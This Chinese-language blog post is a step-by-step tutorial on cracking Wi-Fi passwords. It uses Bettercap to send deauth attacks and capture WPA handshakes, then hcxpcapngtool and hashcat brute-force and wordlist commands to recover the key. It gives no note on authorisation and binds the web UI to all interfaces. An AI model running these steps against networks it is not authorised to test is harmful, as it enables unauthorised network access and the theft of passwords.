---
title: 使用bettercap破解wifi密码
date: 2026-02-24 19:03:33
tags:
---
最近过年回爷爷家，发现爷爷家有一个特殊的USB无线网卡Tenda U6和COMFAST CF-952AX v2，淘宝上都很便宜。  
想起了以前上学时候使用这种USB无线网卡破wifi的经历，就尝试了一下：  
破解wifi的网卡最重要的是驱动是否支持，可以去[这里](https://github.com/morrownr/USB-WiFi/blob/main/home/Recommended_Adapters_for_Kali_Linux.md)查询
如果支持了，可以使用Bettercap进行破解，需要注意这几个问题：  
1.操作系统内核版本，如果是COMFAST CF-952AX v2用的是RTL8852BU需要满足linux内核在4.17以上  
2.操作系统是否开启了WEXT支持，可以用`grep -i wext /boot/config-$(uname -r) `查看，如果提示 `CONFIG_CFG80211_WEXT is not set`则iwlist用不了，需要使用[patch过的版本](https://github.com/bettercap/bettercap/pull/1248)来使用NL80211协议的iw（我和作者battle不过QAQ）  
解决以上问题之后，在虚拟机里面透传usb无线网卡，我是mac用的vmware Fusion。并使用源码编译的方式安装Bettercap：  
```bash
git clone https://github.com/bettercap/bettercap.git
cd bettercap
make install
```
之后使用命令开启webui:  
```bash
 bettercap -eval "set ui.address 0.0.0.0;set api.rest.address 0.0.0.0 ;ui on"
```
在webui里面可以开启wifi模块，当你看到wifi模块里面某个wifi有几个红色的client的时候：  
![20260224194242](https://cdn.jsdelivr.net/gh/fjh1997/CSDN/source/images/20260224194242.png)  
记住他的信道，在这里输入：
```
wifi.recon.channel 11
```
![20260224194405](https://cdn.jsdelivr.net/gh/fjh1997/CSDN/source/images/20260224194405.png)  
之后可以使用deauth攻击等着嗅探出握手包.  
需要注意的是，wifi网卡一次只能监听一个信道，所以一开始的界面是轮流监听信道，可能抓到的握手包不完整，只能当扫描器使用，真正的嗅探握手包还是需要指定信道的。    
![20260224194520](https://cdn.jsdelivr.net/gh/fjh1997/CSDN/source/images/20260224194520.png)  
如果抓到握手包了就可以看到一把钥匙，这个就是抓包文件：  
![20260224194613](https://cdn.jsdelivr.net/gh/fjh1997/CSDN/source/images/20260224194613.png)  
之后使用hcxpcapngtool即可导出让hashcat破解,这个工具也需要[编译安装](https://github.com/ZerBea/hcxtools)：  
```
hcxpcapngtool bettercap-wifi-handshakes.pcap -o keyfile
```
里面的EAPOL pairs(best)就是成功的导出数量：
```
EAPOL pairs (total)......................: 32
EAPOL pairs (best).......................: 3
```
之后使用hashcat即可破解，需要用好一点的显卡：
```
.\hashcat.exe -m 22000 -a 3 .\keyfile ?d?d?d?d?d?d?d?d
```
或者字典攻击，可以使用[seclist](https://github.com/danielmiessler/SecLists/blob/master/Passwords/WiFi-WPA/probable-v2-wpa-top447.txt)：  
```
.\hashcat.exe -m 22000 -a 0 .\keyfile .\probable-v2-wpa-top4800.txt
```
总的来说这个工具比aircrack-ng好用。赞一个。